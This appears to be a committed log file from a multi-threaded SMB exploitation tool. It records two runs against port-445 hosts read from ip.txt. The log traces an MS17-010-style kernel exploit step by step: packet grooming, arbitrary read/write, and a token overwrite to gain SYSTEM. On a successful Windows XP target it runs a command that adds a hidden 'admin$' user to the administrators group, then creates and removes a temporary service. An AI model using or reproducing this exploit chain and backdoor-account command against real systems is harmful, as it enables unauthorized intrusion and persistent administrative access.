@@ -1,0 +1,144 @@
+2018-02-20 16:02:56,888 - INFO - expired!
+2018-02-20 16:09:14,354 - DEBUG - 
+2018-02-20 16:09:46,940 - DEBUG - ip.txt
+2018-02-20 16:09:46,940 - INFO - 
+****************
+***mode:1***
+***addr:ip.txt***
+***port:445***
+***addrs:ip.txt***
+***user:***
+***user file path:***
+***pwd:***
+***pwds:***
+***threads:1***
+***cmd:***
+***batch file:***
+***************
+2018-02-20 16:10:11,720 - DEBUG - ip.txt
+2018-02-20 16:10:11,736 - INFO - 
+****************
+***mode:1***
+***addr:ip.txt***
+***port:445***
+***addrs:ip.txt***
+***user:***
+***user file path:***
+***pwd:***
+***pwds:***
+***threads:3***
+***cmd:***
+***batch file:***
+***************
+2018-02-20 16:10:14,551 - INFO - parser user pwd dic...
+
+2018-02-20 16:10:14,551 - INFO - start attack...
+
+2018-02-20 16:10:14,551 - DEBUG - attackMul...
+2018-02-20 16:10:14,551 - INFO - exploitrth:0 started!
+2018-02-20 16:10:14,551 - INFO - exploitrth:1 started!
+2018-02-20 16:10:14,551 - INFO - exploitrth:2 started!
+2018-02-20 16:10:14,551 - DEBUG - attackMul work starting...
+2018-02-20 16:10:14,566 - INFO - exploit attack target:200.200.200.249 user: pwd:
+2018-02-20 16:10:14,566 - INFO - exploit attack target:200.200.200.145 user: pwd:
+2018-02-20 16:10:14,566 - INFO - exploit attack target:192.168.1.108 user: pwd:
+2018-02-20 16:10:14,566 - INFO - 192.168.1.108: Target OS: Windows 5.1
+2018-02-20 16:10:14,582 - DEBUG - 192.168.1.108 Using named pipe: browser
+2018-02-20 16:10:14,582 - DEBUG - Groom packets
+2018-02-20 16:10:14,598 - INFO - 200.200.200.249: Target OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+2018-02-20 16:10:14,612 - DEBUG - attempt controlling next transaction on x86
+2018-02-20 16:10:14,628 - DEBUG - success controlling one transaction
+2018-02-20 16:10:14,628 - DEBUG - modify parameter count to 0xffffffff to be able to write backward
+2018-02-20 16:10:14,628 - DEBUG - leak next transaction
+2018-02-20 16:10:14,628 - DEBUG - CONNECTION: 0x895c5da8
+2018-02-20 16:10:14,628 - DEBUG - SESSION: 0xe295d578
+2018-02-20 16:10:14,628 - DEBUG - FLINK: 0x8bd48
+2018-02-20 16:10:14,628 - DEBUG - InData: 0x8ae28
+2018-02-20 16:10:14,628 - DEBUG - MID: 0xa
+2018-02-20 16:10:14,644 - DEBUG - TRANS1: 0x88b50
+2018-02-20 16:10:14,644 - DEBUG - TRANS2: 0x8ac90
+2018-02-20 16:10:14,644 - DEBUG - modify transaction struct for arbitrary read/write
+2018-02-20 16:10:14,644 - DEBUG - 200.200.200.249 Not found accessible named pipe
+2018-02-20 16:10:14,644 - INFO - Failure::exploit attack target:200.200.200.249 user: pwd:
+2018-02-20 16:10:14,644 - INFO - exploit attack target:192.168.1.105 user: pwd:
+2018-02-20 16:10:14,644 - DEBUG - make this SMB session to be SYSTEM
+2018-02-20 16:10:14,660 - DEBUG - current TOKEN addr: 0xe29a0df8
+2018-02-20 16:10:14,660 - DEBUG - userAndGroupCount: 0x3
+2018-02-20 16:10:14,676 - DEBUG - userAndGroupsAddr: 0xe29a0e98
+2018-02-20 16:10:14,676 - DEBUG - overwriting token UserAndGroups
+2018-02-20 16:10:14,676 - INFO - exec net user admin$ admin$12345 /add && net localgroup administrators admin$ /add
+2018-02-20 16:10:14,691 - DEBUG - Opening SVCManager on 192.168.1.108.....
+2018-02-20 16:10:14,707 - DEBUG - Creating service ZbdB.....
+2018-02-20 16:10:14,737 - DEBUG - Starting service ZbdB.....
+2018-02-20 16:10:14,910 - DEBUG - SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
+2018-02-20 16:10:14,910 - DEBUG - Removing service ZbdB.....
+2018-02-20 16:10:14,926 - INFO - 
+ target:192.168.1.108 is succeed!
+2018-02-20 16:10:35,594 - INFO - exploit error! ERROR:[Errno Connection error (200.200.200.145:445)] [Errno 10060] 
+2018-02-20 16:10:35,594 - INFO - Failure::exploit attack target:200.200.200.145 user: pwd:
+2018-02-20 16:10:35,671 - INFO - exploit error! ERROR:[Errno Connection error (192.168.1.105:445)] [Errno 10060] 
+2018-02-20 16:10:35,671 - INFO - Failure::exploit attack target:192.168.1.105 user: pwd:
+2018-02-20 16:21:24,686 - DEBUG - 
+2018-02-20 16:31:30,309 - DEBUG - 
+2018-02-20 16:31:43,990 - DEBUG - ip.txt
+2018-02-20 16:31:43,990 - INFO - 
+****************
+***mode:1***
+***addr:ip.txt***
+***port:445***
+***addrs:ip.txt***
+***user:***
+***user file path:***
+***pwd:***
+***pwds:***
+***threads:2***
+***cmd:***
+***batch file:***
+***************
+2018-02-20 16:31:45,084 - INFO - parser user pwd dic...
+
+2018-02-20 16:31:45,084 - INFO - start attack...
+
+2018-02-20 16:31:45,084 - DEBUG - attackMul...
+2018-02-20 16:31:45,084 - INFO - exploitrth:0 started!
+2018-02-20 16:31:45,084 - INFO - exploitrth:1 started!
+2018-02-20 16:31:45,099 - DEBUG - attackMul work starting...
+2018-02-20 16:31:45,115 - INFO - exploit attack target:200.200.200.249 user: pwd:
+2018-02-20 16:31:45,115 - INFO - exploit attack target:200.200.200.145 user: pwd:
+2018-02-20 16:31:45,148 - INFO - 200.200.200.249: Target OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+2018-02-20 16:31:45,180 - DEBUG - 200.200.200.249 Not found accessible named pipe
+2018-02-20 16:31:45,180 - INFO - Failure::exploit attack target:200.200.200.249 user: pwd:
+2018-02-20 16:31:45,180 - INFO - exploit attack target:192.168.1.108 user: pwd:
+2018-02-20 16:31:45,180 - INFO - 192.168.1.108: Target OS: Windows 5.1
+2018-02-20 16:31:45,194 - DEBUG - 192.168.1.108 Using named pipe: browser
+2018-02-20 16:31:45,194 - DEBUG - Groom packets
+2018-02-20 16:31:45,210 - DEBUG - attempt controlling next transaction on x86
+2018-02-20 16:31:45,226 - DEBUG - success controlling one transaction
+2018-02-20 16:31:45,226 - DEBUG - modify parameter count to 0xffffffff to be able to write backward
+2018-02-20 16:31:45,226 - DEBUG - leak next transaction
+2018-02-20 16:31:45,226 - DEBUG - CONNECTION: 0x8959d5e8
+2018-02-20 16:31:45,226 - DEBUG - SESSION: 0xe34f21c8
+2018-02-20 16:31:45,226 - DEBUG - FLINK: 0x8bd48
+2018-02-20 16:31:45,226 - DEBUG - InData: 0x8ae28
+2018-02-20 16:31:45,242 - DEBUG - MID: 0xa
+2018-02-20 16:31:45,242 - DEBUG - TRANS1: 0x88b50
+2018-02-20 16:31:45,242 - DEBUG - TRANS2: 0x8ac90
+2018-02-20 16:31:45,242 - DEBUG - modify transaction struct for arbitrary read/write
+2018-02-20 16:31:45,242 - DEBUG - make this SMB session to be SYSTEM
+2018-02-20 16:31:45,257 - DEBUG - current TOKEN addr: 0xe3523270
+2018-02-20 16:31:45,273 - DEBUG - userAndGroupCount: 0x3
+2018-02-20 16:31:45,273 - DEBUG - userAndGroupsAddr: 0xe3523310
+2018-02-20 16:31:45,273 - DEBUG - overwriting token UserAndGroups
+2018-02-20 16:31:45,273 - INFO - exec net user admin$ admin$12345 /add && net localgroup administrators admin$ /add
+2018-02-20 16:31:45,289 - DEBUG - Opening SVCManager on 192.168.1.108.....
+2018-02-20 16:31:45,319 - DEBUG - Creating service UjaA.....
+2018-02-20 16:31:45,351 - DEBUG - Starting service UjaA.....
+2018-02-20 16:31:45,523 - DEBUG - SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
+2018-02-20 16:31:45,523 - DEBUG - Removing service UjaA.....
+2018-02-20 16:31:45,539 - INFO - exploit attack target:192.168.1.105 user: pwd:
+2018-02-20 16:31:45,555 - INFO - 
+ target:192.168.1.108 is succeed!
+2018-02-20 16:32:06,125 - INFO - exploit error! ERROR:[Errno Connection error (200.200.200.145:445)] [Errno 10060] 
+2018-02-20 16:32:06,125 - INFO - Failure::exploit attack target:200.200.200.145 user: pwd:
+2018-02-20 16:32:06,562 - INFO - exploit error! ERROR:[Errno Connection error (192.168.1.105:445)] [Errno 10060] 
+2018-02-20 16:32:06,562 - INFO - Failure::exploit attack target:192.168.1.105 user: pwd:
